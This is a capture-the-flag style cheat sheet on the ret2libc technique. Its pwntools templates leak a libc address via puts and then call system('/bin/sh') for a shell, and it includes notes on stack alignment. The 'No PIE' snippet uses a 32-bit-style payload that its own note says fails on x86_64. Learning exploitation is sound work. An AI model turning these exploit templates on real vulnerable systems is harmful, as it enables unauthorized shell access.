# ret2libc Technique

## Concept
When NX is enabled (no shellcode execution on stack) but ASLR may or may not be enabled, redirect execution to existing libc functions (like `system()`) instead of injecting shellcode.

## Prerequisites
```
1. Buffer overflow with control over return address
2. Known or leaked libc base address (if ASLR enabled)
3. Access to libc functions: system(), execve(), or one_gadget
```

## Step 1: Determine if ASLR/PIE affects libc
```bash
checksec ./binary
# If binary is statically linked or libc has no ASLR (rare in CTF), skip leak step
```

## Step 2: Leak libc Base (if ASLR enabled)
```python
from pwn import *

elf = ELF('./binary')
p = process('./binary')

offset = 72
pop_rdi = 0x401234  # find via ROPgadget

payload = flat(
    b'A' * offset,
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']    # return to main for stage 2
)
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"Leaked puts: {hex(leak)}")
```

## Step 3: Compute Libc Base and Resolve Addresses
```python
libc = ELF('./libc.so.6')  # must match exact target version
libc.address = leak - libc.symbols['puts']
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))
```

## Step 4: Trigger system('/bin/sh')
```python
payload2 = flat(
    b'A' * offset,
    pop_rdi, binsh_addr,
    system_addr
)
p.sendline(payload2)
p.interactive()
```

## No PIE/No ASLR Case (Simplest)
```python
from pwn import *

elf = ELF('./binary')
p = process('./binary')

offset = 72
binsh = next(elf.libc.search(b'/bin/sh\x00'))  # if statically known
system_plt = elf.plt['system']

payload = flat(b'A' * offset, system_plt, 0xdeadbeef, binsh)
p.sendline(payload)
p.interactive()
```
Note: x86_64 calling convention needs `pop rdi; ret` gadget before calling system directly (unlike x86 stack-based args).

## Stack Alignment Issues (movaps crash on some libc versions)
```python
# Some libc versions require 16-byte stack alignment before calling functions
# Add an extra 'ret' gadget before the target call to fix alignment
ret_gadget = 0x401235  # any single 'ret' instruction address
payload = flat(b'A' * offset, ret_gadget, pop_rdi, binsh_addr, system_addr)
```

## Verifying Libc Version Match
```bash
# If exact libc.so.6 wasn't provided by challenge, identify via leaked offset
# https://libc.blukat.me/ - upload with leaked function+offset
```

## Full Working Template
```python
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = elf.process()

offset = 72
pop_rdi = 0x401234
ret_gadget = 0x401235

# Stage 1: leak
payload = flat(b'A'*offset, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main'])
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Stage 2: shell
payload = flat(b'A'*offset, ret_gadget, pop_rdi, next(libc.search(b'/bin/sh\x00')), libc.symbols['system'])
p.sendline(payload)
p.interactive()
```
